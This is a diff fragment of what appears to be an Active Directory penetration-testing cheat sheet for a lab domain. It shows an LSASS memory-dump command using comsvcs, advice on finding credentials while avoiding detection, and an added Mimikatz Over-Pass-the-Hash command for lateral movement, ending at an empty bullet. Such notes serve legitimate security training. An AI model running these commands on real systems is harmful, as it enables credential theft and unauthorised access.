@@ -463,4 +463,15 @@ $ tasklist /FI "IMAGENAME eq lsass.exe" rundll32.exe C:\windows\System32\comsvcs
 > **Note :** Anything that interact with LSASS has higher chances of detection, so before trying to extract credentials from LSASS we can try to lookup other revenues e.g powershell console history, Local SAM hives, Credential Notes etc.
 
 
+## **Lateral Movement - OverPass-The-Hash**
 
+
+- Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
+
+
+```powershell
+$ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
+```
+
+
+-  
